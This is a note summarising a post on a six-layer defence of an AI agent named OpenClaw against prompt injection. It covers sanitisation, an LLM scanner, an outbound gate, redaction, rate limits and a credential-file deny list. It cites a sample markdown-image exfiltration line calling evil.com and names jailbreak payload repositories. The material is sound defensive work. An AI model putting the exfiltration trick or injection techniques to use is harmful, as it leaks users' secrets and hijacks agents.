# Teaching OpenClaw to not get Hacked — Matthew Berman

**Source:** https://x.com/i/status/2030423565355676100
**Date:** 2026-03-08
**Saved:** 2026-03-24

## Resumen

6 capas de defensa, 2,800 líneas, 132 tests.

## Las 6 Capas

### Layer 1: Deterministic Sanitization (11 steps)
- Invisible Unicode chars stripping
- Wallet draining char detection (3,500 chars → 35,000 tokens)
- Lookalike character normalization (~40 pairs)
- Token budget enforcement (real token cost, not char count)
- Combining marks cleanup
- Base64/hex hidden instruction detection
- Statistical anomaly detection
- Role markers/jailbreak pattern matching
- Code block stripping
- Hard character limit fallback
- Returns detection stats for quarantine decisions

### Layer 2: Frontier Scanner (LLM-based)
- Dedicated classification LLM (strongest model, NOT the agent's main model)
- Structured JSON: verdict, risk score 0-100, categories, reasoning, evidence
- Review at 35, block at 70 (configurable)
- System overrides model verdict if score contradicts
- Fail closed for high-risk (email, webhooks), fail open for low-risk
- Double resistance: model already hard to hijack + actively looking for hijack

### Layer 3: Outbound Content Gate
- Secrets/API keys pattern matching
- Injection artifacts in output
- Data exfiltration via markdown images: `![img](evil.com?data=SECRET)`
- Financial data leaks
- Internal file paths
- All instant, no API calls

### Layer 4: Redaction Pipeline
- API keys/tokens (8 formats)
- Personal emails (gmail, yahoo vs work domains)
- Phone numbers
- Dollar amounts
- Chains into single pipeline before any outbound message

### Layer 5: Runtime Governance
- Spend limit: $5 warn / $15 cap in 5-min window
- Volume limit: 200 calls/10min global, per-caller overrides (email: 40, scanner: 50)
- Lifetime limit: 300 calls/process (simplest loop stopper)
- Duplicate detection: prompt hash cache, return cached responses
- All in-memory, JSON config with per-caller overrides

### Layer 6: Access Control
- Path guards: deny list (.env, credentials.json, SSH keys, sensitive extensions)
- Directory containment (follow symlinks)
- URL safety: only http/https, resolve hostnames, block private/reserved ranges
- DNS rebinding protection

## Nightly Security Review
- File permissions
- Gateway settings
- Secrets in version control
- Security module tampering
- Suspicious log entries
- Cross-reference findings with codebase

## 80/20 Version
1. Sanitize untrusted text before any LLM sees it
2. Scanner behind single entry point
3. Wrap LLM client with spend/volume/duplicate limits
4. One outbound gate before any message leaves

## Key Quotes
- "Bugs burn more money than attacks"
- "No single layer is enough, independence is the point"
- "Use the strongest model for the scanner — a weak model scanning for injections is more likely to fall for the attack"

## Attack References
- Pliny the Prompter: L1B3RT4S, P4RS3LT0NGV3, TOKEN80M8/TOKENADE
- OWASP LLM Prompt Injection Prevention Cheat Sheet
- Anthropic's mitigating prompt injections in browser use

## Full Build Prompt
(Included in article — 6 layers, tests with real attack payloads from repos above)
